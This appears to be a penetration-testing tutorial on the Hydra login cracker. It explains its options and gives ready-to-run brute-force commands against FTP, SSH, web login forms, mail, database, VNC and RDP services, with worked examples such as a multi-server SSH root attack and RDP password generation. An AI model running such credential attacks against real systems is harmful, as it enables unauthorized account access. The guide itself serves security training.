Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.

## Basic Usage
```shell
hydra [login_options] [password_options] [attack_options] [service_options]
```

| Parameter               | Explanation                                                                                                | Usage Example                                                                                                   |
| ----------------------- | ---------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `-l LOGIN` or `-L FILE` | Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).    | `hydra -l admin ...` or `hydra -L usernames.txt ...`                                                            |
| `-p PASS` or `-P FILE`  | Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`). | `hydra -p password123 ...` or `hydra -P passwords.txt ...`                                                      |
| `-t TASKS`              | Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.           | `hydra -t 4 ...`                                                                                                |
| `-f`                    | Fast mode: Stop the attack after the first successful login is found.                                      | `hydra -f ...`                                                                                                  |
| `-s PORT`               | Port: Specify a non-default port for the target service.                                                   | `hydra -s 2222 ...`                                                                                             |
| `-v` or `-V`            | Verbose output: Display detailed information about the attack's progress, including attempts and results.  | `hydra -v ...` or `hydra -V ...` (for even more verbosity)                                                      |
| `service://server`      | Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.      | `hydra ssh://192.168.1.100`                                                                                     |
| `/OPT`                  | Service-specific options: Provide any additional options required by the target service.                   | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication) |

### Hydra Services
|Hydra Service|Service/Protocol|Description|Example Command|
|---|---|---|---|
|ftp|File Transfer Protocol (FTP)|Used to brute-force login credentials for FTP services, commonly used to transfer files over a network.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|
|ssh|Secure Shell (SSH)|Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|
|http-get/post|HTTP Web Services|Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.|`hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
|smtp|Simple Mail Transfer Protocol|Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.|`hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`|
|pop3|Post Office Protocol (POP3)|Targets email retrieval services to brute-force credentials for POP3 login.|`hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`|
|imap|Internet Message Access Protocol|Used to brute-force credentials for IMAP services, which allow users to access their email remotely.|`hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`|
|mysql|MySQL Database|Attempts to brute-force login credentials for MySQL databases.|`hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`|
|mssql|Microsoft SQL Server|Targets Microsoft SQL servers to brute-force database login credentials.|`hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`|
|vnc|Virtual Network Computing (VNC)|Brute-forces VNC services, used for remote desktop access.|`hydra -P /path/to/password_list.txt vnc://192.168.1.100`|
|rdp|Remote Desktop Protocol (RDP)|Targets Microsoft RDP services for remote login brute-forcing.|`hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`|


### Brute-Forcing HTTP Authentication
Imagine you're tasked with testing the security of a website using basic HTTP authentication at `www.example.com`. You have a list of potential usernames stored in `usernames.txt` and corresponding passwords in `passwords.txt`. To launch a brute-force attack against this HTTP service, use the following Hydra command:

```shell
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

### Targeting Multiple SSH Servers
```shell
hydra -l root -p toor -M targets.txt ssh
```
### Testing FTP Credentials on a Non-Standard Port
```shell
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
### Brute-Forcing a Web Login Form
```shell
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

### Advanced RDP Brute-Forcing
Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers.

```shell
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
This command instructs Hydra to:
- Use the username "administrator".
- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
- Target the RDP service on `192.168.1.100`.
- Employ the `rdp` module for the attack.